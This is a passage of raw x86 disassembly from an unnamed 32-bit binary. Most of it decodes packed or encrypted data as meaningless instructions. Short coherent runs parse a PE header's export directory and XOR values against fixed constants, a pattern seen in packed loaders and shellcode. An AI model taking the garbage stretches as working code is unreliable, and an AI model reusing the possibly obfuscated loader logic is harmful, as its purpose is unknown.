  40673f:	sub    DWORD PTR [ecx],edi
  406741:	sbb    al,0xc7
  406743:	cmp    BYTE PTR [esp+edx*2],bl
  406746:	mov    ah,0x5f
  406748:	sub    edx,DWORD PTR [edx-0x59a0f13d]
  40674e:	inc    eax
  40674f:	(bad)  
  406750:	push   ebp
  406751:	push   ecx
  406752:	jge    0x4067bd
  406754:	call   0x2881:0xdcb996eb
  40675b:	stos   DWORD PTR es:[edi],eax
  40675c:	fdivr  DWORD PTR [ecx-0x5c]
  40675f:	mov    ds:0x6c496dac,eax
  406764:	mov    BYTE PTR [ebp-0x67],0x28
  406768:	xchg   ecx,eax
  406769:	fsubp  st(4),st
  40676b:	nop
  40676c:	and    BYTE PTR [ebx],dh
  40676e:	loopne 0x4067e2
  406770:	add    al,0x31
  406772:	fwait
  406773:	adc    edx,esp
  406775:	mov    esp,0x59b47afb
  40677a:	in     eax,0xb4
  40677c:	scas   al,BYTE PTR es:[edi]
  40677d:	sbb    dh,BYTE PTR [esi+0x12886986]
  406783:	ins    BYTE PTR es:[edi],dx
  406784:	stos   BYTE PTR es:[edi],al
  406785:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406786:	sahf   
  406787:	stos   DWORD PTR es:[edi],eax
  406788:	out    0x22,eax
  40678a:	jmp    0x406756
  40678c:	stos   DWORD PTR es:[edi],eax
  40678d:	fistp  QWORD PTR [edi-0x58]
  406790:	jle    0x406811
  406792:	and    bl,BYTE PTR [edx-0x4b1b78a7]
  406798:	xchg   ecx,eax
  406799:	push   ebx
  40679a:	inc    esi
  40679b:	add    eax,0x8e0216d6
  4067a0:	aaa    
  4067a1:	lea    ecx,[edx-0x46]
  4067a4:	xor    al,0x63
  4067a6:	mov    DWORD PTR [ebx],ebx
  4067a8:	(bad)  
  4067aa:	pop    ds
  4067ab:	adc    cl,cl
  4067ad:	icebp  
  4067ae:	(bad)  
  4067af:	leave  
  4067b0:	push   ds
  4067b1:	pop    edx
  4067b2:	popa   
  4067b3:	pop    edx
  4067b4:	ret    
  4067b5:	jge    0x40679c
  4067b7:	les    ebx,FWORD PTR [edx+eiz*8+0x71]
  4067bb:	cmp    al,0x12
  4067bd:	dec    esp
  4067be:	jmp    0x4067db
  4067c0:	xlat   BYTE PTR ds:[ebx]
  4067c1:	dec    edi
  4067c2:	nop
  4067c3:	(bad)  
  4067c4:	jp     0x406770
  4067c6:	popf   
  4067c7:	mov    esp,0xa0322b59
  4067cc:	cdq    
  4067cd:	pop    eax
  4067ce:	inc    esp
  4067cf:	mov    ds:0x20ccecbe,al
  4067d4:	mov    ds:0xca0e79e7,al
  4067d9:	ss ins BYTE PTR es:[edi],dx
  4067db:	pop    edi
  4067dc:	sahf   
  4067dd:	jno    0x4067cd
  4067df:	and    eax,0x348a75e8
  4067e4:	cld    
  4067e5:	loopne 0x4067bf
  4067e7:	mov    BYTE PTR [ebx+0x40],al
  4067ea:	mov    eax,ds:0xc9d76b00
  4067ef:	fldcw  WORD PTR [edi+eiz*2]
  4067f2:	add    bh,BYTE PTR [eax]
  4067f4:	mov    ebp,0x6c7d10eb
  4067f9:	mov    ch,0x5a
  4067fb:	adc    al,0xf3
  4067fd:	neg    BYTE PTR [ecx-0x34dce80]
  406803:	daa    
  406804:	cld    
  406805:	(bad)  
  406806:	repz jb 0x406811
  406809:	add    DWORD PTR [esi-0x77],esi
  40680c:	push   ecx
  40680d:	push   ss
  40680e:	jl     0x4067e0
  406810:	repnz jmp 0x9171:0x9e344ed0
  406818:	sub    bl,dl
  40681a:	sub    DWORD PTR es:[ebx-0xb],0x42
  40681f:	cdq    
  406820:	push   ecx
  406821:	out    0xf8,eax
  406823:	sub    al,0x41
  406825:	add    bl,BYTE PTR [eax]
  406827:	repz aas 
  406829:	icebp  
  40682a:	sub    DWORD PTR [ebp-0x63f19af8],ecx
  406830:	dec    esp
  406831:	and    cx,WORD PTR [eax-0xb3921c]
  406838:	ja     0x4067c2
  40683a:	jp     0x406879
  40683c:	jmp    0x1475:0xa8ef0712
  406843:	sbb    eax,0xa5cabbe4
  406848:	in     eax,0x2a
  40684a:	sub    bh,BYTE PTR [edi]
  40684c:	push   eax
  40684d:	sub    DWORD PTR [ebp+0x67f19f88],esp
  406853:	xchg   esp,eax
  406854:	int3   
  406855:	loope  0x4068aa
  406857:	xchg   edi,eax
  406858:	inc    ebx
  406859:	push   eax
  40685a:	dec    edx
  40685b:	daa    
  40685c:	repnz sbb ch,BYTE PTR [ebx+esi*8+0xd104a93]
  406864:	xchg   ebp,eax
  406865:	dec    esp
  406866:	add    bl,al
  406868:	add    eax,0x19090807
  40686d:	arpl   WORD PTR [edi],di
  40686f:	push   es
  406870:	inc    edi
  406871:	jge    0x406826
  406873:	in     al,dx
  406874:	lods   eax,DWORD PTR ds:[esi]
  406875:	jmp    0xcec68684
  40687a:	and    eax,0x64905fa6
  40687f:	and    DWORD PTR [ecx+0x2c26a236],0xeedc2fa6
  406889:	add    eax,0x278a3476
  40688e:	sahf   
  40688f:	inc    ebp
  406890:	(bad)  
  406891:	pop    ss
  406892:	ret    0x53f
  406895:	lahf   
  406896:	xor    ebp,DWORD PTR [edi-0x1df28a12]
  40689c:	cmp    ch,ch
  40689e:	cmp    ah,BYTE PTR [ebp+esi*1+0x4a9efd64]
  4068a5:	push   ds
  4068a6:	dec    esp
  4068a7:	ja     0x40684d
  4068a9:	and    edi,ecx
  4068ab:	stos   BYTE PTR es:[edi],al
  4068ac:	bound  ebx,QWORD PTR [edi+edx*8+0x5e0beda3]
  4068b3:	dec    ebp
  4068b4:	mov    eax,0x7654474c
  4068b9:	stos   DWORD PTR es:[edi],eax
  4068ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068bb:	das    
  4068bc:	sub    bh,bl
  4068be:	sbb    esp,DWORD PTR [esi+eax*4-0x66]
  4068c2:	inc    esp
  4068c3:	std    
  4068c4:	xor    dl,al
  4068c6:	sbb    dl,BYTE PTR [ebp+0x356b599a]
  4068cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4068cd:	rcr    BYTE PTR [edi+0x215c392],0xac
  4068d4:	call   0xd73b:0x8483edc9
  4068db:	ins    BYTE PTR es:[edi],dx
  4068dc:	cld    
  4068dd:	push   ecx
  4068de:	or     edx,DWORD PTR ds:0x19d19c0b
  4068e4:	retf   0x1c4e
  4068e7:	mov    eax,ds:0x9879b330
  4068ec:	inc    ecx
  4068ed:	icebp  
  4068ee:	push   eax
  4068ef:	xchg   DWORD PTR [ebp-0x7a],ecx
  4068f2:	inc    esp
  4068f3:	mov    edi,0x947b9008
  4068f8:	call   0xe97:0x432c2f68
  4068ff:	cdq    
  406900:	mov    ds:0x375308e2,eax
  406905:	(bad)  [esi+ebp*2-0xe]
  406909:	sub    al,0x23
  40690b:	or     al,0x2f
  40690d:	call   0x80fe401f
  406912:	das    
  406913:	fidiv  DWORD PTR [eax]
  406915:	xor    al,BYTE PTR [edx+ebx*4-0x49eeb132]
  40691c:	xchg   edi,eax
  40691d:	sbb    eax,0xcad83aaf
  406922:	call   0x8865985e
  406927:	js     0x406968
  406929:	pop    eax
  40692a:	(bad)  
  40692c:	leave  
  40692d:	and    eax,0x84f4fed7
  406932:	stc    
  406933:	cmp    eax,0xca091899
  406938:	fcomp  QWORD PTR [ebx-0x288ebb88]
  40693e:	dec    eax
  40693f:	jecxz  0x406900
  406941:	pop    es
  406942:	mov    ebp,0x4c8b4b09
  406947:	test   eax,0xd0d566e2
  40694c:	sub    ebp,DWORD PTR [edi-0x787a5e6d]
  406952:	aad    0xb1
  406954:	(bad)  
  406955:	sbb    BYTE PTR ds:0x6e804885,cl
  40695b:	int3   
  40695c:	shl    DWORD PTR [edx-0x3d],cl
  40695f:	imul   edi,DWORD PTR [edx-0x16e430e1],0x242ce10e
  406969:	scas   eax,DWORD PTR es:[edi]
  40696a:	cmc    
  40696b:	call   0xfad0:0x51cb9e5d
  406972:	or     DWORD PTR [edi+0x6baf095b],edi
  406978:	or     al,0x60
  40697a:	mov    WORD PTR [edi],?
  40697c:	or     al,0xb7
  40697e:	jo     0x40697e
  406980:	std    
  406981:	pop    ss
  406982:	mov    dl,0xb8
  406984:	mov    esi,0xb8f6efab
  406989:	fwait
  40698a:	add    edx,DWORD PTR [esi+0x6b74da85]
  406990:	fcom   QWORD PTR [esp+ebp*2+0x48]
  406994:	mov    dl,0x49
  406996:	fwait
  406997:	dec    ebp
  406998:	rcl    esp,0xf8
  40699b:	add    al,0xea
  40699d:	(bad)  
  40699e:	fwait
  40699f:	aam    0x71
  4069a1:	mov    bh,0x69
  4069a3:	xchg   ecx,eax
  4069a4:	daa    
  4069a5:	mov    bh,0xd1
  4069a7:	dec    edx
  4069a8:	test   eax,0x3036fc1e
  4069ad:	push   0x36e112cc
  4069b2:	mov    ecx,0xa3e42e8a
  4069b7:	out    dx,eax
  4069b8:	lahf   
  4069b9:	es out 0xbe,al
  4069bc:	fwait
  4069bd:	sti    
  4069be:	sub    edx,DWORD PTR [edi]
  4069c0:	adc    esi,esi
  4069c2:	out    dx,al
  4069c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069c4:	pop    edx
  4069c5:	xor    cl,bh
  4069c7:	sbb    al,0x45
  4069c9:	dec    esi
  4069ca:	es cs ja 0x406a39
  4069ce:	sar    BYTE PTR [bp+0x3a1c],1
  4069d3:	jno    0x406a4d
  4069d5:	sbb    eax,0x77690d9e
  4069da:	and    al,0xf9
  4069dc:	mov    edi,0x62915172
  4069e1:	inc    eax
  4069e2:	add    eax,0x62487f8d
  4069e7:	add    DWORD PTR [ecx-0x2b],esp
  4069ea:	mov    bl,0x3c
  4069ec:	adc    esp,0x7d
  4069ef:	fidiv  WORD PTR [ecx]
  4069f1:	or     ah,dl
  4069f3:	or     eax,0xd0793ccd
  4069f8:	jp     0x406a32
  4069fa:	je     0x406a1c
  4069fc:	push   ds
  4069fd:	into   
  4069fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069ff:	xor    BYTE PTR [esi+0x6062e3d7],bh
  406a05:	dec    edx
  406a06:	jbe    0x4069c1
  406a08:	ja     0x4069cd
  406a0a:	out    0xb2,al
  406a0c:	int3   
  406a0d:	push   es
  406a0e:	bound  edi,QWORD PTR [di-0x727a]
  406a13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a14:	add    edi,DWORD PTR [eax]
  406a16:	outs   dx,DWORD PTR ds:[esi]
  406a17:	jmp    0x1684:0xd3c43fab
  406a1e:	add    esp,DWORD PTR ds:0x7cc5f06
  406a24:	pop    ds
  406a25:	xor    DWORD PTR [eax],ecx
  406a27:	push   cs
  406a28:	jl     0x406a68
  406a2a:	ret    
  406a2b:	inc    edx
  406a2c:	xchg   edx,eax
  406a2d:	xor    al,BYTE PTR [ebx]
  406a2f:	ss jmp 0x37ed:0x5ab2e9c
  406a37:	scas   al,BYTE PTR es:[edi]
  406a38:	shl    DWORD PTR [ebx],1
  406a3a:	sbb    ah,0xa8
  406a3d:	scas   eax,DWORD PTR es:[edi]
  406a3e:	pop    ds
  406a3f:	test   al,0x89
  406a41:	inc    ebp
  406a42:	xchg   esp,eax
  406a43:	mov    eax,DWORD PTR [ebp-0x70]
  406a46:	cmp    DWORD PTR [ebp-0x68],eax
  406a49:	jne    0x406a5b
  406a4f:	mov    eax,DWORD PTR [ebp-0x6c]
  406a52:	cmp    DWORD PTR [ebp-0x64],eax
  406a55:	je     0x406a96
  406a5b:	mov    eax,DWORD PTR [ebp+0x8]
  406a5e:	mov    edx,DWORD PTR [ebp+0xc]
  406a61:	mov    edx,DWORD PTR [ebp-0x4]
  406a64:	mov    edx,DWORD PTR [edx+0x3c]
  406a67:	lea    eax,[edx+eax*8+0x78]
  406a6b:	mov    edx,DWORD PTR [ebp-0x4]
  406a6e:	mov    eax,DWORD PTR [edx+eax*1]
  406a71:	mov    DWORD PTR [ebp-0x24],eax
  406a74:	mov    eax,DWORD PTR [esi]
  406a76:	mov    edx,DWORD PTR [esi+0x4]
  406a79:	shrd   eax,edx,0x2
  406a7d:	mov    DWORD PTR [ebp+0x14],eax
  406a80:	mov    eax,DWORD PTR [esi]
  406a82:	xor    DWORD PTR [ebp+0x14],edi
  406a85:	shr    edx,0x2
  406a88:	mov    edx,DWORD PTR [esi+0x4]
  406a8b:	xor    edx,edx
  406a8d:	shl    eax,0x1e
  406a90:	or     edx,DWORD PTR [ebp+0x14]
  406a93:	mov    DWORD PTR [ebp-0x28],edx
  406a96:	mov    eax,DWORD PTR [ebp-0x24]
  406a99:	mov    eax,DWORD PTR [ebp-0x24]
  406a9c:	xor    edx,edx
  406a9e:	shld   edx,eax,0x2
  406aa2:	xor    edx,ecx
  406aa4:	mov    DWORD PTR [ebp+0xc],edx
  406aa7:	mov    edx,DWORD PTR [esi]
  406aa9:	shl    eax,0x2
  406aac:	jmp    0x406e4d
  406ab1:	stos   BYTE PTR es:[edi],al
  406ab2:	outs   dx,BYTE PTR ds:[esi]
  406ab3:	jne    0x406a9b
  406ab5:	mov    ecx,0x99b2bae5
  406aba:	add    ebp,DWORD PTR [esi-0x23]
  406abd:	xor    DWORD PTR [ebx+ebp*8-0x1d],0xbebe41bd
  406ac5:	mov    ebp,0x5bebec4
  406aca:	mov    ds:0xb2b0946f,al
  406acf:	(bad)  
  406ad0:	in     al,dx
  406ad1:	inc    ebp
  406ad2:	mov    ds:0x43488ee2,eax
  406ad7:	out    0xfd,eax
  406ad9:	xchg   BYTE PTR [ecx+0x57dde4d5],cl
  406adf:	xor    DWORD PTR [ebx],edi
  406ae1:	or     eax,0xdc0ae1a4
  406ae6:	xor    esi,0xffffffef
  406ae9:	sbb    al,0x32
  406aeb:	inc    edi
  406aec:	mov    edx,0xab44fc74
  406af1:	out    0x13,eax
  406af3:	sahf   
  406af4:	jp     0x406af9
  406af6:	je     0x406b02
  406af8:	call   0x6843457a
  406afd:	xchg   esi,eax
  406afe:	jo     0x406ad3
  406b00:	cs jo  0x406acf
  406b03:	rdpmc  
  406b05:	and    eax,0xb28032cb
  406b0a:	xor    eax,0x52b91e8e
  406b0f:	cmc    
  406b10:	in     eax,dx
  406b11:	arpl   WORD PTR [ecx-0x69],sp
  406b14:	fld    TBYTE PTR [eax+0x27]
  406b17:	mov    al,0x9d
  406b19:	ins    DWORD PTR es:[edi],dx
  406b1a:	data16 adc ah,al
  406b1d:	pop    ebx
  406b1e:	and    ecx,edi
  406b20:	add    eax,0xedb9c3b1
  406b25:	fistp  QWORD PTR [esi+0x179ba92b]
  406b2b:	mov    ecx,0xeb94c0bf
  406b30:	jmp    0x2770:0x20f201e6
  406b37:	and    eax,0x2d4f911a
  406b3c:	fcmovnbe st,st(1)
  406b3e:	mov    bl,0xb1
  406b40:	out    0x81,al
  406b42:	out    dx,eax
  406b43:	fwait
  406b44:	data16 sti 
  406b46:	mov    dh,0xe5
  406b48:	cs sbb eax,0x2fb916b7
  406b4e:	xor    ebx,edx
  406b50:	inc    eax
  406b51:	inc    ebx
  406b52:	push   ebp
  406b53:	jae    0x406ad7
  406b55:	sahf   
  406b56:	cmp    eax,0x3df1dce0
  406b5b:	xchg   dh,al
  406b5d:	outs   dx,BYTE PTR ds:[esi]
  406b5e:	(bad)  
  406b60:	xlat   BYTE PTR ds:[ebx]
  406b61:	(bad)  
  406b63:	add    DWORD PTR [ebx-0x5cf3ae58],eax
  406b69:	cmp    eax,esp
  406b6b:	bound  edi,QWORD PTR [ecx+0x5c]
  406b6e:	cmp    esi,DWORD PTR [ebx]
  406b70:	aaa    
  406b71:	pop    es
  406b72:	push   esi
  406b74:	nop
  406b75:	xlat   BYTE PTR ds:[ebx]
  406b76:	int3   
  406b77:	dec    esp
  406b78:	inc    ebp
  406b79:	mov    ds:0x45bb6544,al
  406b7e:	mov    ebx,0x77c99825
  406b83:	xchg   DWORD PTR [eax],ebp
  406b85:	(bad)  
  406b86:	inc    esp
  406b87:	mov    dh,0x12
  406b89:	jne    0x406bef
  406b8b:	imul   ebx,edx,0x6a442736
  406b91:	sbb    BYTE PTR ds:0x9c1ed032,al
  406b97:	cwde   
  406b98:	ins    DWORD PTR es:[edi],dx
  406b99:	cmp    edi,esp
  406b9b:	js     0x406b36
  406b9d:	jbe    0x406ba0
  406b9f:	cwde   
  406ba0:	(bad)
  406ba3:	ja     0x406b44
  406ba5:	call   DWORD PTR [ebx]
  406ba7:	mov    bl,0x35
  406ba9:	inc    cl
  406bab:	pop    ebp
  406bac:	dec    ebp
  406bad:	shl    DWORD PTR [edi+0x12],1
  406bb0:	outs   dx,DWORD PTR ds:[esi]
  406bb1:	mov    dh,0x5c
  406bb3:	mov    ecx,DWORD PTR [ecx-0x2b]
  406bb6:	das    
  406bb7:	inc    edx
  406bb8:	xchg   ebx,eax
  406bb9:	and    edx,esi
  406bbb:	mov    ds,WORD PTR [esi+eax*1-0x424998be]
  406bc2:	ins    DWORD PTR es:[edi],dx
  406bc3:	pushf  
  406bc4:	push   ds
  406bc5:	or     al,0x87
  406bc7:	sbb    dl,0x76
  406bca:	mov    ch,0x24
  406bcc:	lods   eax,DWORD PTR ds:[esi]
  406bcd:	adc    BYTE PTR [ebx-0x40676cc5],dl
  406bd3:	adc    DWORD PTR [eax+ecx*1],0xffffffd6
  406bd7:	cmp    ch,bl
  406bd9:	push   es
  406bda:	inc    edi
  406bdb:	pop    edx
  406bdc:	push   ebp
  406bdd:	inc    esp
  406bde:	ja     0x406baf
  406be0:	pop    es
  406be1:	lahf   
  406be2:	lea    esi,[edx-0x3ac8699d]
  406be8:	retf   
  406be9:	fs mov ebp,0x61f6e0bc
  406bef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406bf0:	and    BYTE PTR [ebp-0x6fa98f09],ah
  406bf6:	adc    DWORD PTR [ecx+0xb5c0267],edx
  406bfc:	(bad)  
  406bfd:	(bad)  
  406bfe:	sbb    eax,DWORD PTR [edi+0x6]
  406c01:	sub    ebp,DWORD PTR [ebx+0x7e]
  406c04:	test   eax,0x6683eaf9
  406c09:	ret    0x9987
  406c0c:	call   0x318f:0xf0bda882
  406c13:	outs   dx,DWORD PTR cs:[esi]
  406c15:	push   edi
  406c16:	mov    ecx,0xdfb3c0d4
  406c1b:	add    al,0x3
  406c1d:	sub    cl,BYTE PTR [edx-0x6ff4e132]
  406c23:	mov    ds,esp
  406c25:	pop    es
  406c26:	loope  0x406bd0
  406c28:	jo     0x406be3
  406c2a:	or     DWORD PTR [esp+edx*8-0x4ee43cec],edi
  406c31:	cmp    BYTE PTR [eax],ch
  406c33:	leave  
  406c34:	sahf   
  406c35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c36:	loop   0x406c02
  406c38:	push   esi
  406c39:	bound  eax,QWORD PTR [esp+edx*8+0xc7b321a]
  406c40:	stos   DWORD PTR es:[edi],eax
  406c41:	and    bl,BYTE PTR [ebp-0x58]
  406c44:	push   ebx
  406c45:	mov    bl,dh
  406c47:	leave  
  406c48:	(bad)  
  406c49:	sub    ebx,DWORD PTR [ebx-0x70a6c172]
  406c4f:	popf   
  406c50:	popa   
  406c51:	push   esi
  406c52:	popa   
  406c53:	jns    0x406c7a
  406c55:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c57:	clc    
  406c58:	inc    ebp
  406c59:	into   
  406c5a:	dec    ecx
  406c5b:	xchg   DWORD PTR [ebp+0x5d],esi
  406c5e:	in     al,0x53
  406c60:	in     al,0x98
  406c62:	xor    al,0xdd
  406c64:	adc    DWORD PTR [ebx-0x2f],eax
  406c67:	xchg   ecx,eax
  406c68:	add    BYTE PTR [edi-0x75],0x91
  406c6c:	iret   
  406c6d:	pop    esp
  406c6e:	loop   0x406c0a
  406c70:	fistp  QWORD PTR [ebx-0x6c83d49f]
  406c76:	jo     0x406cc1
  406c78:	mov    al,ds:0x877f09ec
  406c7d:	rcl    DWORD PTR [ebx+edi*2],1
  406c80:	pop    ecx
  406c81:	mov    eax,0x811ee41a
  406c86:	fs jno 0x406c1d
  406c89:	jno    0x406cb7
  406c8b:	cmp    al,0x26
  406c8d:	or     bh,BYTE PTR [ebx+ebp*1+0x60fa4203]
  406c94:	pop    edi
  406c95:	xchg   DWORD PTR [esi+0x6f],edx
  406c98:	(bad)  
  406c99:	push   ecx
  406c9a:	sbb    al,0xb5
  406c9c:	rol    ebx,cl
  406c9e:	mov    ?,WORD PTR [edx+ecx*2]
  406ca1:	shr    bh,0xcf
  406ca4:	enter  0x9e3e,0x3e
  406ca8:	js     0x406d11
  406caa:	arpl   WORD PTR [edx],dx
  406cac:	mov    al,ds:0x6bf59529
  406cb1:	mov    bl,BYTE PTR [edx-0x7bab79]
  406cb7:	push   0x34431020
  406cbc:	sar    DWORD PTR [edx-0x2e],0x6d
  406cc0:	cmp    eax,0x82f9651
  406cc5:	jo     0x406d2d
  406cc7:	pop    edi
  406cc8:	pop    ss
  406cc9:	or     ah,dh
  406ccb:	adc    cl,BYTE PTR [ebp+0x590eda65]
  406cd1:	dec    ebx
  406cd2:	xor    DWORD PTR [edi-0x68],ebx
  406cd5:	ret    
  406cd6:	sub    BYTE PTR [ecx],ah
  406cd8:	test   eax,0xc6564155
  406cdd:	xchg   esi,edi
  406cdf:	push   ss
  406ce0:	lods   al,BYTE PTR ds:[esi]
  406ce1:	xchg   bl,dh
  406ce3:	dec    ecx
  406ce4:	inc    edi
  406ce5:	retf   
  406ce6:	jle    0x406c78
  406ce8:	jmp    0x406d10
  406cea:	fadd   DWORD PTR [edx+ebp*2-0x6dee889e]
  406cf1:	stos   DWORD PTR es:[edi],eax
  406cf2:	dec    ebp
  406cf3:	in     al,0x7d
  406cf5:	add    al,0x7b
  406cf7:	pop    ss
  406cf8:	out    dx,al
  406cf9:	pop    edi
  406cfa:	pop    esi
  406cfb:	pop    eax
  406cfc:	sbb    eax,0x9bd1befa
  406d01:	sbb    edx,DWORD PTR ds:0xc77cc3bc
  406d07:	jl     0x406d5b
  406d09:	adc    DWORD PTR [ebx],0x6c
  406d0c:	stc    
  406d0d:	scas   eax,DWORD PTR es:[edi]
  406d0e:	enter  0x269a,0x19
  406d12:	dec    ebx
  406d13:	cli    
  406d14:	or     DWORD PTR [ecx+0x4a],0x11
  406d18:	neg    BYTE PTR [ecx]
  406d1a:	repnz inc esi
  406d1c:	test   DWORD PTR gs:[esp+ebp*1],ebx
  406d20:	repnz sub dl,0x1d
  406d24:	inc    BYTE PTR [edx+0x55995c83]
  406d2a:	xor    BYTE PTR [ecx+0x70cb4afe],bl
  406d30:	(bad)  
  406d31:	in     al,dx
  406d32:	jnp    0x406d0b
  406d34:	fisub  DWORD PTR [edx-0x67821b2c]
  406d3a:	fs cli 
  406d3c:	das    
  406d3d:	sbb    al,0x3d
  406d3f:	mov    esp,0xa8310919
  406d44:	inc    ecx
  406d45:	cdq    
  406d46:	push   ss
  406d47:	int3   
  406d48:	cwde   
  406d49:	sbb    cl,BYTE PTR [esi-0x9c9a536]
  406d4f:	mov    eax,0x67b00cb1
  406d54:	fisttp WORD PTR [edi+0x6]
  406d57:	push   esp
  406d58:	dec    edi
  406d59:	fild   QWORD PTR [esi-0x67]
  406d5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d5d:	out    dx,al
  406d5e:	out    dx,al
  406d5f:	into   
  406d60:	sub    DWORD PTR [esi],esi
  406d62:	addr16 mov ebp,0xf067ac7e
  406d68:	repnz cmc 
  406d6a:	into   
  406d6b:	imul   edx,DWORD PTR ds:0xf3394a90,0x57
  406d72:	sti    
  406d73:	mov    edx,0x6017b7bc
  406d78:	jge    0x406dc9
  406d7a:	scas   eax,DWORD PTR es:[edi]
  406d7b:	rol    ebx,0xaa
  406d7e:	jge    0x406dca
  406d80:	retf   
  406d81:	push   es
  406d82:	xor    eax,esp
  406d84:	ret    0x6cd7
  406d87:	mov    bh,dl
  406d89:	push   edi
  406d8a:	or     BYTE PTR [ebp+0x4],al
  406d8d:	sar    DWORD PTR [edi-0xe],cl
  406d90:	jmp    FWORD PTR [esi]
  406d92:	pusha  
  406d93:	pop    ebp
  406d94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d95:	push   esi
  406d96:	xor    BYTE PTR [ebx],bh
  406d98:	out    0x77,eax
  406d9a:	mov    al,ds:0x382b4452
  406d9f:	ror    DWORD PTR [ebx],1
  406da1:	fstp   TBYTE PTR [eax]
  406da3:	cmp    BYTE PTR [ecx-0x44d0868e],al
  406da9:	pop    ebp
  406daa:	shr    DWORD PTR [ebp+0x9],cl
  406dad:	outs   dx,DWORD PTR ds:[esi]
  406dae:	hlt    
  406daf:	(bad)  
  406db1:	or     al,0x8d
  406db3:	xor    eax,0x891f17cf
  406db8:	xlat   BYTE PTR ds:[ebx]
  406db9:	mov    esp,0xfa1a37ce
  406dbe:	xchg   esp,eax
  406dbf:	leave  
  406dc0:	pop    ecx
  406dc1:	pop    esp
  406dc2:	in     al,dx
  406dc3:	push   es
  406dc4:	cdq    
  406dc5:	push   esi
  406dc6:	outs   dx,DWORD PTR ds:[esi]
  406dc7:	cli    
  406dc8:	fistp  WORD PTR [ecx]
  406dca:	cmp    eax,0xeb02ea30
  406dcf:	mov    edi,0x8f2e372a
  406dd4:	je     0x406d7e
  406dd6:	push   eax
  406dd7:	mov    bl,0xad
  406dd9:	cli    
  406dda:	add    DWORD PTR [ebx-0x18],0xffffff87
  406dde:	mov    ds:0x30de1874,al
  406de3:	pop    es
  406de4:	aaa    
  406de5:	push   edi
  406de6:	push   edx
  406de7:	mov    ah,0x0
  406de9:	mov    cl,0x67
  406deb:	mov    ch,BYTE PTR [edi+0x56]
  406dee:	hlt    
  406def:	xor    DWORD PTR [edi+0x527b3f3c],0xffffff81
  406df6:	xor    DWORD PTR [edx+0x2b],edi
  406df9:	dec    eax
  406dfa:	xor    DWORD PTR [eax],esi
  406dfc:	sbb    eax,0x5d306343
  406e01:	dec    ebx
  406e02:	jae    0x406d92
  406e04:	push   ebp
  406e05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e06:	jge    0x406dc1
  406e08:	mov    esi,ebx
  406e0a:	cmp    eax,0x1cfce799
  406e0f:	or     BYTE PTR [ebx+0x44],cl
  406e12:	pop    edx
  406e13:	jmp    0x406dc4
  406e15:	xchg   bl,ch
  406e17:	dec    edx
  406e18:	inc    esp
  406e19:	scas   eax,DWORD PTR es:[edi]
  406e1a:	push   edx
  406e1b:	ficom  DWORD PTR [esi]
  406e1d:	mov    WORD PTR [ebp+edx*8-0x8],gs
  406e21:	inc    edx
  406e22:	pushf  
  406e23:	lods   eax,DWORD PTR ds:[esi]
  406e24:	push   es
  406e25:	mov    ds:0x53f6896c,al
  406e2a:	daa    
  406e2b:	push   0x292a6288
  406e30:	xchg   ebx,ebx
  406e32:	idiv   edi
  406e34:	mov    ecx,0xd4f0f551
  406e39:	mov    es,WORD PTR ds:[esi-0x69]
  406e3d:	inc    ebx
  406e3e:	push   ebx
  406e3f:	sbb    DWORD PTR [ecx],ebx
  406e41:	push   ecx
  406e42:	push   ebx
  406e43:	push   ss
  406e44:	pop    edi
  406e45:	inc    ebp
  406e46:	jnp    0x406e67
  406e48:	push   ss
  406e49:	sub    bh,bh
  406e4b:	jl     0x406eae
  406e4d:	mov    DWORD PTR [ebp+0x10],edx
  406e50:	mov    edx,DWORD PTR [esi+0x4]
  406e53:	xor    eax,0xcb79b576
  406e58:	mov    DWORD PTR [ebp+0x14],edx
  406e5b:	cmp    eax,DWORD PTR [ebp+0x10]
  406e5e:	jne    0x407653
  406e64:	mov    eax,edx
  406e66:	cmp    DWORD PTR [ebp+0xc],eax
  406e69:	jne    0x407653
  406e6f:	mov    eax,DWORD PTR [esi]
  406e71:	mov    edx,DWORD PTR [esi+0x4]
  406e74:	mov    eax,DWORD PTR [esi]
  406e76:	mov    edx,DWORD PTR [esi+0x4]
  406e79:	mov    edx,eax
  406e7b:	xor    eax,eax
  406e7d:	shl    edx,0x1e
  406e80:	mov    DWORD PTR [ebp+0x10],eax
  406e83:	mov    eax,DWORD PTR [esi]
  406e85:	xor    edx,0x80000000
  406e8b:	mov    DWORD PTR [ebp+0x14],edx
  406e8e:	mov    edx,DWORD PTR [esi+0x4]
  406e91:	xor    eax,0xcb79b577
  406e96:	xor    ecx,edx
  406e98:	shrd   eax,ecx,0x2
  406e9c:	or     eax,DWORD PTR [ebp+0x10]
  406e9f:	shr    ecx,0x2
  406ea2:	mov    DWORD PTR [ebp+0x8],eax
  406ea5:	mov    eax,ecx
  406ea7:	or     eax,DWORD PTR [ebp+0x14]
  406eaa:	mov    ecx,DWORD PTR [ebx]
  406eac:	mov    edx,DWORD PTR [ebx+0x4]
  406eaf:	push   eax
  406eb0:	push   DWORD PTR [ebp+0x8]
  406eb3:	push   edx
  406eb4:	push   ecx
  406eb5:	call   0x41594e
  406eba:	mov    eax,DWORD PTR [esi]
  406ebc:	mov    ecx,DWORD PTR [esi+0x4]
  406ebf:	shrd   eax,ecx,0x2
  406ec3:	shr    ecx,0x2
  406ec6:	shr    edx,0x1e
  406ec9:	xor    ecx,0xe70ae2ba
  406ecf:	push   ecx
  406ed0:	xor    eax,edi
  406ed2:	mov    DWORD PTR [ebp+0x10],edx
  406ed5:	mov    edx,DWORD PTR [ebx]
  406ed7:	mov    edi,DWORD PTR [ebx+0x4]
  406eda:	push   eax
  406edb:	push   edi
  406edc:	push   edx
  406edd:	call   0x41594e
  406ee2:	shld   edx,eax,0x2
  406ee6:	mov    ecx,edx
  406ee8:	xor    edx,edx
  406eea:	or     ecx,edx
  406eec:	mov    edx,DWORD PTR [esi]
  406eee:	mov    edi,DWORD PTR [esi+0x4]
